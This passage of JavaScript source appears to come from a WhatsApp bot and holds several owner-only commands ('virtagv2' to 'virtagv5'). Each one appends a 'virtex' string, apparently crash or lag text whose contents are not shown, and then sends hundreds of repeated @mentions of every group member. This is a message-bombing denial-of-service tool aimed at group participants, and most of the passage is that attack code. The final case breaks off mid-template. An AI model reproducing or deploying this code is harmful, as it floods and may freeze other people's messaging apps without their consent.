@${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} `
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
break
case 'virtagv2':  
if (!dev.key.fromMe) return reply('Lu siapa')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `${spamvirtex}`
					for (let mem of groupMembers) {
						teks += ` 
					    @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}   @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} `
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
break
case 'virtagv3':  
if (!dev.key.fromMe) return reply('Lu siapa')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `${virtex9(prefix)}`
					for (let mem of groupMembers) {
						teks += ` 
					    @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}   @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} `
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
break
case 'virtagv4':  
if (!dev.key.fromMe) return reply('Lu siapa')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `${zoemods}`
					for (let mem of groupMembers) {
						teks += ` 
					    @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}   @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} `
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
break
case 'virtagv5':  
if (!dev.key.fromMe) return reply('Lu siapa')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `${virtexbyzoe}`
					for (let mem of groupMembers) {
						teks += ` 
					    @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}   @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  